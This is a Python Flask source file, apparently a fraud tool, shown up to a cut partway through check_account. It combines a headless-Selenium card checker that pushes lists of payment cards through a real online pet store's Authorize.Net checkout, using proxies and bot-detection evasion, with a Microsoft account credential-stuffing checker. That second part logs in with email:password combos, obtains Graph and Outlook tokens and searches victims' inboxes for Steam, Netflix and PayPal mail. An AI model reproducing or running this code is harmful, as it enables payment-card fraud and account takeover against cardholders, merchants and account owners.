import os
import re
import time
import random
import threading
import concurrent.futures
import requests
import urllib3
import uuid
import json
import zipfile
import shutil
import subprocess
import sys
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from flask import Flask, render_template, request, jsonify, send_file, send_from_directory
from flask_cors import CORS
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import Select
from collections import Counter

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
CORS(app)

PORT = int(os.environ.get('PORT', 5000))

# ============================================
# CONFIGURACIÓN
# ============================================
CONFIG = {
    'threads': 100,
    'timeout': 15,
    'proxies_file': 'proxies.txt',
    'accounts_file': 'acc.txt',
    'cards_file': 'cards.txt'
}

try:
    import configparser
    config = configparser.ConfigParser()
    if os.path.exists('config_inbox.ini'):
        config.read('config_inbox.ini', encoding='utf-8')
        CONFIG['threads'] = config.getint('General', 'threads', fallback=100)
        CONFIG['timeout'] = config.getint('General', 'timeout', fallback=15)
        CONFIG['proxies_file'] = config.get('General', 'proxies_file', fallback='proxies.txt')
        CONFIG['accounts_file'] = config.get('General', 'accounts_file', fallback='acc.txt')
except:
    pass

# ============================================
# ESTADO GLOBAL
# ============================================
checker_state = {
    'running': False,
    'stats': {
        'checked': 0,
        'valid': 0,
        'inbox': 0,
        'custom': 0,
        'bad': 0,
        '2fa': 0,
        'errors': 0,
        'retries': 0,
        'cpm': 0,
        'total': 0
    },
    'results': {
        'valid': [],
        'inbox': [],
        '2fa': [],
        'bad': [],
        'errors': [],
        'approved': [],
        'declined': [],
        'invalid': [],
        'pending': []
    },
    'logs': [],
    'start_time': None,
    'session_folder': None,
    'export_ready': False,
    'export_files': [],
    'card_results': []
}

# ============================================
# AUTHORIZE.NET CARD CHECKER
# ============================================

B = "https://store.unclebills.com"
PROD_URL = B + "/a-pup-above-frozen-turkey-pawella-1-lb-dry-dog-food"
PROD_ID = "7277"

def mkdriver(proxy=None):
    opts = Options()
    opts.add_argument('--no-sandbox')
    opts.add_argument('--disable-gpu')
    opts.add_argument('--disable-dev-shm-usage')
    opts.add_argument('--window-size=1400,900')
    opts.add_argument('--disable-web-security')
    opts.add_argument('--headless=new')  # Modo headless para servidor
    opts.add_experimental_option('excludeSwitches', ['enable-automation'])
    
    # Usar Chrome en el servidor (sin rutas fijas)
    opts.add_argument('--disable-blink-features=AutomationControlled')
    opts.add_experimental_option('useAutomationExtension', False)
    
    # Proxy si se proporciona
    if proxy:
        opts.add_argument(f'--proxy-server={proxy}')
    
    # Intentar diferentes ubicaciones de Chrome
    chrome_paths = [
        '/usr/bin/google-chrome',
        '/usr/bin/chromium-browser',
        '/usr/bin/chromium',
        'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
        'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe'
    ]
    
    for path in chrome_paths:
        if os.path.exists(path):
            opts.binary_location = path
            break
    
    # ChromeDriver automático
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        svc = Service(ChromeDriverManager().install())
        return webdriver.Chrome(service=svc, options=opts)
    except:
        # Fallback: intentar con chromedriver en PATH
        try:
            svc = Service('chromedriver')
            return webdriver.Chrome(service=svc, options=opts)
        except:
            return None

def handle_alert(driver):
    try:
        a = driver.switch_to.alert
        txt = a.text
        a.accept()
        return txt
    except:
        return ""

def step_add_to_cart(driver):
    try:
        driver.get(PROD_URL)
        time.sleep(1.5)
        
        tok = re.findall(r'__RequestVerificationToken[^>]+value="([^"]+)"', driver.page_source)
        if not tok:
            return False
        token = tok[0]
        
        driver.execute_script("""
            var x = new XMLHttpRequest();
            x.open('POST', '/addproducttocart/details/""" + PROD_ID + """/1', false);
            x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            x.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
            x.send('__RequestVerificationToken=' + encodeURIComponent(arguments[0]) + '&addtocart_""" + PROD_ID + """.EnteredQuantity=1');
        """, token)
        time.sleep(1)
        
        driver.get(B + "/onepagecheckout")
        time.sleep(2)
        return "Checkout" in driver.title
    except:
        return False

def step_fill_checkout(driver):
    try:
        driver.execute_script('Accordion.openSection("#opc-shipping")')
        time.sleep(1.5)
        
        fields = [
            ('ShippingNewAddress_FirstName', 'John'),
            ('ShippingNewAddress_LastName', 'Doe'),
            ('ShippingNewAddress_Email', 'john@test.com'),
            ('ShippingNewAddress_City', 'Fort Wayne'),
            ('ShippingNewAddress_Address1', '6339 W Jefferson Blvd'),
            ('ShippingNewAddress_ZipPostalCode', '46804'),
            ('ShippingNewAddress_PhoneNumber', '2125551234'),
        ]
        for fid, val in fields:
            try:
                el = driver.find_element(By.ID, fid)
                if el.is_displayed() and el.is_enabled():
                    el.clear()
                    el.send_keys(val)
            except:
                pass
        
        try:
            Select(driver.find_element(By.ID, 'ShippingNewAddress_CountryId')).select_by_value('1')
        except:
            pass
        time.sleep(2)
        try:
            Select(driver.find_element(By.ID, 'ShippingNewAddress_StateProvinceId')).select_by_value('21')
        except:
            pass
        
        driver.execute_script('Shipping.save()')
        time.sleep(1)
        handle_alert(driver)
        
        driver.execute_script('Accordion.openSection("#opc-billing")')
        time.sleep(1.5)
        
        try:
            nb = driver.find_element(By.ID, 'new-billing-address')
            if nb.is_enabled() and not nb.is_selected():
                driver.execute_script('arguments[0].click();', nb)
            time.sleep(1)
        except:
            pass
        
        bill_fields = [
            ('BillingNewAddress_FirstName', 'James'),
            ('BillingNewAddress_LastName', 'yaser'),
            ('BillingNewAddress_Email', 'test@test.com'),
            ('BillingNewAddress_City', 'Elizabeth'),
            ('BillingNewAddress_Address1', '37674 Oak Ln'),
            ('BillingNewAddress_ZipPostalCode', '80107'),
            ('BillingNewAddress_PhoneNumber', '7205994578'),
        ]
        for fid, val in bill_fields:
            try:
                el = driver.find_element(By.ID, fid)
                if el.is_displayed() and el.is_enabled():
                    el.clear()
                    el.send_keys(val)
            except:
                pass
        
        try:
            country_el = driver.find_element(By.ID, 'BillingNewAddress_CountryId')
            Select(country_el).select_by_value('1')
            driver.execute_script("arguments[0].dispatchEvent(new Event('change',{bubbles:true}));", country_el)
            time.sleep(2.5)
        except:
            pass
        
        try:
            state_el = driver.find_element(By.ID, 'BillingNewAddress_StateProvinceId')
            Select(state_el).select_by_value('10')
        except:
            pass
        
        driver.execute_script('Billing.save()')
        time.sleep(2)
        err = handle_alert(driver)
        if err and ('required' in err.lower() or 'object' in err.lower() or 'not set' in err.lower()):
            try:
                state_el = driver.find_element(By.ID, 'BillingNewAddress_StateProvinceId')
                driver.execute_script("arguments[0].value='';", state_el)
            except:
                pass
            driver.execute_script('Billing.save()')
            time.sleep(2)
            handle_alert(driver)
        
        driver.execute_script('Accordion.openSection("#opc-payment_method")')
        time.sleep(0.5)
        try:
            Select(driver.find_element(By.ID, 'paymentmethod')).select_by_value('Payments.AuthorizeNet')
        except:
            pass
        driver.execute_script('PaymentMethod.save()')
        time.sleep(0.5)
        handle_alert(driver)
        
        return True
    except:
        return False

def step_submit_payment(driver, card):
    try:
        driver.execute_script('Accordion.openSection("#opc-payment_info")')
        time.sleep(2)
        
        ey = card['ey'] if len(card['ey']) == 4 else "20" + card['ey']
        card_name = card.get('nm', 'James yaser') or 'James yaser'
        
        driver.execute_script(f"""
            var setV = function(id, val) {{
                var e = document.getElementById(id);
                if (e) {{ e.value = val; e.dispatchEvent(new Event('change',{{bubbles:true}})); }}
            }};
            setV('CardholderName', '{card_name}');
            setV('CardNumber', '{card['n']}');
            setV('CardCode', '{card['cv']}');
            try {{ document.getElementById('ExpireMonth').value = '{card['em']}'; }} catch(e) {{}}
            try {{ document.getElementById('ExpireYear').value = '{ey}'; }} catch(e) {{}}
        """)
        
        driver.execute_script('PaymentInfo.save()')
        time.sleep(3)
        handle_alert(driver)
        
        for retry in range(2):
            driver.execute_script('ConfirmOrder.save()')
            time.sleep(3)
            err = handle_alert(driver)
            if err:
                if "payment information" in err.lower() and "not entered" in err.lower() and retry == 0:
                    driver.execute_script('PaymentInfo.save()')
                    time.sleep(2)
                    handle_alert(driver)
                    continue
            break
        return True
    except:
        return False

def step_read_response(driver):
    try:
        ps = driver.page_source.lower()
        if "thank you" in ps or "order completed" in ps or "order placed" in ps:
            return ("APPROVED", "Order confirmed")
        
        m = re.search(r'(?:error|payment error)\s*[#:]*\s*(\d+)[:\s]*([^<]{5,150})', ps, re.I)
        if m:
            code = m.group(1)
            msg = m.group(2).strip()
            if "declined" in ps or "declined" in msg.lower():
                return ("DECLINED", f"Error #{code}: {msg[:100]}")
            if "expired" in msg.lower() or "expir" in msg.lower():
                return ("DECLINED", f"Error #{code}: {msg[:100]}")
            if "invalid" in msg.lower() or "invalid" in ps:
                return ("INVALID", f"Error #{code}: {msg[:100]}")
            return ("DECLINED", f"Error #{code}: {msg[:100]}")
        
        if "declined" in ps:
            m2 = re.search(r'(?:declined|this transaction)[^<]{5,150}', ps)
            return ("DECLINED", m2.group().strip()[:120] if m2 else "Declined")
        
        if "invalid" in ps and "card" in ps:
            return ("INVALID", "Card rejected")
        
        if "billing" in ps and ("not provided" in ps or "required" in ps):
            return ("PENDING", "Billing not provided")
        
        if "payment" in ps and "not entered" in ps:
            return ("PENDING", "Payment info not saved")
        
        if "error" in ps:
            return ("ERROR", "Form error")
        
        return ("UNKNOWN", "No clear result")
    except:
        return ("ERROR", "Failed to read response")

def test_card(card, proxy=None):
    driver = mkdriver(proxy)
    if not driver:
        return "ERROR", "Failed to initialize driver", ""
    
    try:
        if not step_add_to_cart(driver):
            return "ERROR", "Cart add failed", ""
        if not step_fill_checkout(driver):
            return "PENDING", "Checkout form failed", ""
        if not step_submit_payment(driver, card):
            return "PENDING", "Payment not submitted", ""
        status, msg = step_read_response(driver)
        return status, msg, ""
    except Exception as e:
        return "ERROR", str(e)[:100], ""
    finally:
        try:
            driver.quit()
        except:
            pass

# ============================================
# FUNCIONES DE UTILIDAD
# ============================================
def get_flag(country_code: str) -> str:
    flag_map = {
        'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
        'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'BR': '🇧🇷', 'IN': '🇮🇳',
        'JP': '🇯🇵', 'KR': '🇰🇷', 'CN': '🇨🇳', 'RU': '🇷🇺', 'MX': '🇲🇽',
        'SA': '🇸🇦', 'AE': '🇦🇪', 'TR': '🇹🇷', 'NL': '🇳🇱', 'SE': '🇸🇪',
        'NO': '🇳🇴', 'DK': '🇩🇰', 'FI': '🇫🇮', 'PL': '🇵🇱', 'CZ': '🇨🇿',
        'GR': '🇬🇷', 'PT': '🇵🇹', 'IE': '🇮🇪', 'CH': '🇨🇭', 'AT': '🇦🇹',
        'BE': '🇧🇪', 'LU': '🇱🇺', 'IS': '🇮🇸', 'NZ': '🇳🇿', 'SG': '🇸🇬',
        'MY': '🇲🇾', 'ID': '🇮🇩', 'TH': '🇹🇭', 'VN': '🇻🇳', 'PH': '🇵🇭'
    }
    return flag_map.get(country_code.upper(), '🏴')

def normalize_combo(line):
    line = line.strip()
    if not line:
        return None
    
    separators = [':', '|', ';', ',', ' ', '\t']
    for sep in separators:
        if sep in line:
            parts = line.split(sep, 1)
            email = parts[0].strip()
            password = parts[1].strip()
            if email and password and '@' in email:
                return f"{email}:{password}"
    
    if '@' in line and line.count('@') == 1:
        return None
    
    return None

def parse_accounts(text):
    accounts = []
    for line in text.split('\n'):
        normalized = normalize_combo(line)
        if normalized:
            accounts.append(normalized)
    return accounts

def parse_keywords(text):
    return [line.strip() for line in text.split('\n') if line.strip() and not line.startswith('#')]

def parse_proxies(text):
    proxies = []
    for line in text.split('\n'):
        line = line.strip()
        if line:
            if line.startswith('http'):
                proxies.append(line)
            elif '@' in line:
                proxies.append(f"http://{line}")
            else:
                proxies.append(f"http://{line}")
    return proxies

def parse_cards(text):
    cards = []
    for line in text.split('\n'):
        line = line.strip()
        if not line:
            continue
        
        # Intentar diferentes formatos
        parts = re.split(r'[|,;:\t\s]+', line)
        if len(parts) >= 3:
            cn = parts[0].strip().replace(' ', '').replace('-', '')
            if cn.isdigit() and len(cn) >= 13:
                exp = parts[1].strip().split('/')
                em = exp[0].zfill(2) if exp and exp[0].isdigit() else '12'
                ey = exp[1][-2:] if len(exp) > 1 and exp[1].isdigit() else '28'
                cv = parts[2].strip()[:4]
                nm = parts[3].strip()[:50] if len(parts) > 3 else ''
                
                # Detectar marca
                brand = 'VISA' if cn.startswith('4') else ('MASTERCARD' if re.match(r'^5[1-5]', cn) else ('AMEX' if cn[:2] in ('34','37') else 'OTHER'))
                
                cards.append({
                    'n': cn,
                    'em': em,
                    'ey': ey,
                    'cv': cv,
                    'nm': nm,
                    'b6': cn[:6],
                    'l4': cn[-4:],
                    'br': brand
                })
    
    return cards

def format_proxy(proxy):
    if not proxy: 
        return None
    proxy = proxy.strip()
    
    if proxy.startswith('http'):
        return proxy
        
    parts = proxy.split(':')
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif '@' in proxy:
        return f"http://{proxy}"
    else:
        return f"http://{proxy}"

def get_session_folder():
    if checker_state['session_folder'] is None:
        base = "Results"
        if not os.path.exists(base):
            os.makedirs(base)
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        checker_state['session_folder'] = os.path.join(base, f"Results_{timestamp}")
        os.makedirs(checker_state['session_folder'], exist_ok=True)
    return checker_state['session_folder']

def save_result(filename, content):
    folder = get_session_folder()
    path = os.path.join(folder, filename)
    with open(path, 'a', encoding='utf-8') as f:
        f.write(content + '\n')

def create_optimized_session():
    session = requests.Session()
    threads = CONFIG.get('threads', 100)
    pool_size = threads + 50
    
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    
    retry_strategy = Retry(
        total=2,
        backoff_factor=0.3,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "POST", "OPTIONS"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=pool_size, pool_maxsize=pool_size)
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    return session

def add_log(message, level='info'):
    timestamp = datetime.now().strftime('%H:%M:%S')
    checker_state['logs'].insert(0, {
        'time': timestamp,
        'message': message,
        'level': level
    })
    if len(checker_state['logs']) > 500:
        checker_state['logs'] = checker_state['logs'][:500]

def update_stats():
    stats = checker_state['stats']
    if stats['checked'] > 0 and checker_state['start_time']:
        elapsed = time.time() - checker_state['start_time']
        if elapsed > 0:
            stats['cpm'] = int(stats['checked'] / elapsed * 60)

# ============================================
# FUNCIÓN DE VERIFICACIÓN DE CARD
# ============================================
def check_card(card, proxies):
    if not checker_state['running']:
        return
    
    try:
        proxy = None
        if proxies:
            proxy = format_proxy(random.choice(proxies))
        
        status, msg, gw = test_card(card, proxy)
        
        ico = {"APPROVED":"[+]","DECLINED":"[!]","INVALID":"[-]","PENDING":"[~]","ERROR":"[E]"}.get(status,"[?]")
        
        result = {
            'card': f"{card['b6']}...{card['l4']}",
            'brand': card['br'],
            'status': status,
            'reason': msg,
            'full': f"{card['n']}|{card['em']}|{card['ey']}|{card['cv']}"
        }
        
        checker_state['card_results'].append(result)
        
        # Guardar en archivos
        save_result('Cards_Results.txt', f"{card['n']}|{card['em']}|{card['ey']}|{card['cv']} | {status} | {msg}")
        
        # Guardar por estado
        if status == 'APPROVED':
            checker_state['stats']['valid'] += 1
            checker_state['results']['approved'].append(f"{card['n']}|{card['em']}|{card['ey']}|{card['cv']} | {msg}")
            save_result('Approved.txt', f"{card['n']}|{card['em']}|{card['ey']}|{card['cv']} | {msg}")
            add_log(f"{ico} {card['b6']}...{card['l4']} - {status} - {msg}", 'success')
        elif status == 'DECLINED':
            checker_state['stats']['bad'] += 1
            checker_state['results']['declined'].append(f"{card['n']}|{card['em']}|{card['ey']}|{card['cv']} | {msg}")
            save_result('Declined.txt', f"{card['n']}|{card['em']}|{card['ey']}|{card['cv']} | {msg}")
            add_log(f"{ico} {card['b6']}...{card['l4']} - {status} - {msg}", 'warning')
        elif status == 'INVALID':
            checker_state['stats']['bad'] += 1
            checker_state['results']['invalid'].append(f"{card['n']}|{card['em']}|{card['ey']}|{card['cv']} | {msg}")
            save_result('Invalid.txt', f"{card['n']}|{card['em']}|{card['ey']}|{card['cv']} | {msg}")
            add_log(f"{ico} {card['b6']}...{card['l4']} - {status} - {msg}", 'error')
        elif status == 'PENDING':
            checker_state['stats']['2fa'] += 1
            checker_state['results']['pending'].append(f"{card['n']}|{card['em']}|{card['ey']}|{card['cv']} | {msg}")
            save_result('Pending.txt', f"{card['n']}|{card['em']}|{card['ey']}|{card['cv']} | {msg}")
            add_log(f"{ico} {card['b6']}...{card['l4']} - {status} - {msg}", 'info')
        else:
            checker_state['stats']['errors'] += 1
            checker_state['results']['errors'].append(f"{card['n']}|{card['em']}|{card['ey']}|{card['cv']} | {msg}")
            save_result('Errors.txt', f"{card['n']}|{card['em']}|{card['ey']}|{card['cv']} | {msg}")
            add_log(f"{ico} {card['b6']}...{card['l4']} - {status} - {msg}", 'error')
    
    except Exception as e:
        checker_state['stats']['errors'] += 1
        add_log(f"⚠️ {card.get('b6', '')}...{card.get('l4', '')} - ERROR: {str(e)}", 'error')
    
    finally:
        with threading.Lock():
            checker_state['stats']['checked'] += 1
        update_stats()

# ============================================
# CLASE MICROSOFT CHECKER (PARA EMAIL)
# ============================================
class MicrosoftInboxChecker:
    def __init__(self, email, password, proxy=None, inbox_keywords=None):
        self.email = email
        self.password = password
        self.proxy = proxy
        self.inbox_keywords = inbox_keywords if inbox_keywords else ["Steam", "Netflix", "PayPal"]
        self.session = create_optimized_session()
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.country = None
        self.name = None
        self.sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'

    def get_urlPost_sFTTag(self):
        maxretries = 3
        attempts = 0
        
        while attempts < maxretries:
            try:
                headers = {
                    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0", 
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
                    'Accept-Language': 'en-US,en;q=0.9', 
                    'Accept-Encoding': 'gzip, deflate, br', 
                    'Connection': 'keep-alive', 
                    'Upgrade-Insecure-Requests': '1'
                }
                
                text = self.session.get(self.sFTTag_url, headers=headers, timeout=CONFIG['timeout'], verify=False).text
                
                match = re.search('value=\\\\\\"(.+?)\\\\\\"', text, re.S) or \
                       re.search('value="(.+?)"', text, re.S) or \
                       re.search("sFTTag:'(.+?)'", text, re.S) or \
                       re.search('sFTTag:"(.+?)"', text, re.S) or \
                       re.search('name="PPFT".*?value="(.+?)"', text, re.S)
                
                if match:
                    sFTTag = match.group(1)
                    match = re.search('"urlPost":"(.+?)"', text, re.S) or \
                           re.search("urlPost:'(.+?)'", text, re.S) or \
                           re.search('urlPost:"(.+?)"', text, re.S) or \
                           re.search('<form.*?action="(.+?)"', text, re.S)
                    
                    if match:
                        urlPost = match.group(1)
                        urlPost = urlPost.replace('&amp;', '&')
                        return urlPost, sFTTag
            except Exception:
                pass
            
            attempts += 1
            time.sleep(0.5)
        
        return None, None

    def get_xbox_rps(self, urlPost, sFTTag):
        maxretries = 3
        tries = 0
        
        while tries < maxretries:
            try:
                data = {'login': self.email, 'loginfmt': self.email, 'passwd': self.password, 'PPFT': sFTTag}
                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded', 
                    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36", 
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
                    'Accept-Language': 'en-US,en;q=0.9', 
                    'Accept-Encoding': 'gzip, deflate, br', 
                    'Connection': 'close'
                }
                
                login_request = self.session.post(urlPost, data=data, headers=headers, allow_redirects=True, timeout=CONFIG['timeout'], verify=False)
                
                if '#' in login_request.url and login_request.url != self.sFTTag_url:
                    token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ['None'])[0]
                    if token != 'None':
                        return 'SUCCESS'
                
                elif 'cancel?mkt=' in login_request.text:
                    try:
                        ipt = re.search(r'(?<="ipt" value=").+?(?=">)', login_request.text)
                        pprid = re.search(r'(?<="pprid" value=").+?(?=">)', login_request.text)
                        uaid = re.search(r'(?<="uaid" value=").+?(?=">)', login_request.text)
                        
                        if ipt and pprid and uaid:
                            data = {'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}
                            
                            action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', login_request.text)
                            if action:
                                ret = self.session.post(action.group(), data=data, allow_redirects=True, timeout=CONFIG['timeout'], verify=False)
                                
                                return_url = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text)
                                if return_url:
                                    fin = self.session.get(return_url.group(), allow_redirects=True, timeout=CONFIG['timeout'], verify=False)
                                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                                    if token != 'None':
                                        return 'SUCCESS'
                    except:
                        pass
                
                elif any(value in login_request.text for value in ['recover?mkt', 'account.live.com/identity/confirm?mkt', 'Email/Confirm?mkt', '/Abuse?mkt=']):
                    return '2FA'
                
                elif any(value in login_request.text.lower() for value in [
                    'password is incorrect', 
                    "account doesn't exist", 
                    "that microsoft account doesn't exist",
                    'sign in to your microsoft account',
                    "tried to sign in too many times with an incorrect account or password",
                    'help us protect your account'
                ]):
                    return 'BAD'
                
            except Exception:
                pass
            
            tries += 1
            time.sleep(0.5)
        
        return 'BAD'

    def login(self):
        urlPost, sFTTag = self.get_urlPost_sFTTag()
        if not urlPost or not sFTTag:
            return 'BAD'
        
        return self.get_xbox_rps(urlPost, sFTTag)

    def get_graph_token(self):
        try:
            client_id = '0000000048170EF2'
            scope = 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.ReadWrite'
            
            auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
            
            r = self.session.get(auth_url, timeout=CONFIG['timeout'], verify=False)
            parsed_fragment = parse_qs(urlparse(r.url).fragment)
            token = parsed_fragment.get('access_token', [None])[0]
            
            if not token:
                scope = 'https://graph.microsoft.com/Mail.Read'
                auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
                r = self.session.get(auth_url, timeout=CONFIG['timeout'], verify=False)
                parsed_fragment = parse_qs(urlparse(r.url).fragment)
                token = parsed_fragment.get('access_token', [None])[0]
            
            return token
        except:
            return None

    def get_profile_via_graph(self, token):
        try:
            headers = {
                'Authorization': f'Bearer {token}',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0'
            }
            
            r = self.session.get('https://graph.microsoft.com/v1.0/me', headers=headers, timeout=10, verify=False)
            
            if r.status_code == 200:
                data = r.json()
                self.country = data.get('country', data.get('mobilePhone', 'Unknown'))
                if not self.country or self.country == 'Unknown':
                    try:
                        r2 = self.session.get('https://graph.microsoft.com/v1.0/me/mailboxSettings', headers=headers, timeout=10, verify=False)
                        if r2.status_code == 200:
                            settings = r2.json()
                            self.country = settings.get('timeZone', 'Unknown')
                    except:
                        pass
                
                self.name = data.get('displayName', 'Unknown')
                return True
            return False
        except:
            return False

    def get_profile_via_substrate(self):
        try:
            self.session.get('https://outlook.live.com/owa/', timeout=10, verify=False)
            
            scope = 'https://substrate.office.com/User-Internal.ReadWrite'
            client_id = '0000000048170EF2'
            auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
            
            r = self.session.get(auth_url, timeout=CONFIG['timeout'], verify=False)
            parsed_fragment = parse_qs(urlparse(r.url).fragment)
            token = parsed_fragment.get('access_token', [None])[0]
            
            if not token:
                return False
            
            cid = self.session.cookies.get('MSPCID', self.email)
            
            headers = {
                'Authorization': f'Bearer {token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json',
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json'
            }
            
            r = self.session.get('https://substrate.office.com/profileb2/v2.0/me/V1Profile', headers=headers, timeout=10, verify=False)
            
            if r.status_code == 200:
                data = r.json()
                self.country = data.get('accounts', [{}])[0].get('location', 'Unknown')
                self.name = data.get('names', [{}])[0].get('displayName', 'Unknown')
                return True
            return False
        except:
            return False

    def check_inbox_via_graph(self):
        token = self.get_graph_token()
        if not token:
            return 0, []
        
        found_info = []
        total_found_sum = 0
        
        headers = {
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        }
        
        for keyword in self.inbox_keywords:
            try:
                query = f"https://graph.microsoft.com/v1.0/me/messages?$search=\"subject:{keyword}\"&$select=subject,receivedDateTime&$top=25"
                r = self.session.get(query, headers=headers, timeout=10, verify=False)
                
                if r.status_code == 200:
                    data = r.json()
                    total = data.get('@odata.count', 0)
                    
                    if total == 0 and 'value' in data:
                        total = len(data['value'])
                    
                    if total > 0:
                        total_found_sum += total
                        found_info.append(f"{keyword}: {total}")
                        
                        try:
                            query2 = f"https://graph.microsoft.com/v1.0/me/messages?$search=\"body:{keyword}\"&$select=subject&$top=25"
                            r2 = self.session.get(query2, headers=headers, timeout=10, verify=False)
                            if r2.status_code == 200:
                                data2 = r2.json()
                                total2 = data2.get('@odata.count', len(data2.get('value', [])))
                                if total2 > 0:
                                    total_found_sum += total2
                                    found_info.append(f"{keyword}(body): {total2}")
                        except:
                            pass
            except:
                pass
        
        return total_found_sum, found_info

    def check_inbox(self):
        total_found, found_info = self.check_inbox_via_graph()
        
        if total_found > 0:
            return total_found, found_info
        
        token = self.get_access_token_for_outlook()
        if not token:
            return 0, []
        
        cid = self.session.cookies.get('MSPCID', self.email)
        
        headers = {
            'Authorization': f'Bearer {token}',
            'X-AnchorMailbox': f'CID:{cid}',
            'Content-Type': 'application/json',
            'User-Agent': 'Outlook-Android/2.0',
            'Accept': 'application/json',
            'Host': 'substrate.office.com'
        }

        found_info = []
        total_found_sum = 0
        
        url = 'https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124'
        
        for keyword in self.inbox_keywords:
            try:
                payload = {
                    'Cvid': str(uuid.uuid4()),
                    'Scenario': {'Name': 'owa.react'},
                    'TimeZone': 'UTC',
                    'TextDecorations': 'Off',
                    'EntityRequests': [{
                        'EntityType': 'Conversation',
                        'ContentSources': ['Exchange'],
                        'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}, {'Term': {'DistinguishedFolderName': 'DeletedItems'}}]},
                        'From': 0,
                        'Query': {'QueryString': keyword},
                        'Size': 25,
                        'EnableTopResults': True,
                        'TopResultsCount': 3
                    }],
                    'AnswerEntityRequests': [{'Query': {'QueryString': keyword}, 'EntityTypes': ['Event', 'File'], 'From': 0, 'Size': 10, 'EnableAsyncResolution': True}],
                    'QueryAlterationOptions': {'EnableSuggestion': True, 'EnableAlteration': True}
                }
                
                r = self.session.post(url, json=payload, headers=headers, timeout=10, verify=False)
                if r.status_code == 200:
                    data = r.json()
                    total = 0
                    if 'EntitySets' in data:
                        for entity_set in data['EntitySets']:
                            if 'ResultSets' in entity_set:
                                for result_set in entity_set['ResultSets']:
                                    if 'Total' in result_set:
                                        total = result_set['Total']
                                    elif 'ResultCount' in result_set:
                                        total = result_set['ResultCount']
                                    elif 'Results' in result_set:
                                        total = len(result_set['Results'])
                    
                    if total > 0:
                        total_found_sum += total
                        found_info.append(f"{keyword}: {total}")
            except:
                pass
                
        return total_found_sum, found_info

    def get_access_token_for_outlook(self):
        try:
            self.session.get('https://outlook.live.com/owa/', timeout=10, verify=False)
            
            scope = 'https://substrate.office.com/User-Internal.ReadWrite'
            client_id = '0000000048170EF2'
            auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
            
            r = self.session.get(auth_url, timeout=CONFIG['timeout'], verify=False)
            parsed_fragment = parse_qs(urlparse(r.url).fragment)
            token = parsed_fragment.get('access_token', [None])[0]
            
            if not token:
                auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope=service::outlook.office.com::MBI_SSL&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
                r = self.session.get(auth_url, timeout=CONFIG['timeout'], verify=False)
                parsed_fragment = parse_qs(urlparse(r.url).fragment)
                token = parsed_fragment.get('access_token', [None])[0]
                
            return token
        except:
            return None

# ============================================
# FUNCIÓN DE VERIFICACIÓN DE CUENTA (EMAIL)
# ============================================
def check_account(email, password, keywords, proxies):
    if not checker_state['running']:
        return
    
    try:
        proxy = None
        if proxies:
            proxy = format_proxy(random.choice(proxies))
        
        checker = MicrosoftInboxChecker(email, password, proxy, inbox_keywords=keywords)
        
        status = checker.login()

        if status == 'SUCCESS':
            with threading.Lock():
                checker_state['stats']['valid'] += 1
            
            graph_token = checker.get_graph_token()
            country_obtained = False
